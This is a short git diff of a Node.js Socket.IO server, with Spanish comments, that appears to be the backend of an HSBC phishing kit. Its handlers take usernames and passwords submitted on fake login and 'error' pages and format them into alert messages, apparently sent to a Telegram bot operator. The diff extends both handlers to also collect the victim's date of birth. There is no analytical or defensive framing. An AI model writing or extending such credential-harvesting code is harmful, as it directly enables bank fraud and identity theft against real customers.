@@ -27,10 +27,10 @@ io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
   // Login principal
-  socket.on('dataForm', ({ usuario, contrasena, sessionId }) => {
+  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso HSBC:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso HSBC:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -87,10 +87,10 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ usuario, contrasena, sessionId }) => {
+  socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado HSBC:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado HSBC:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
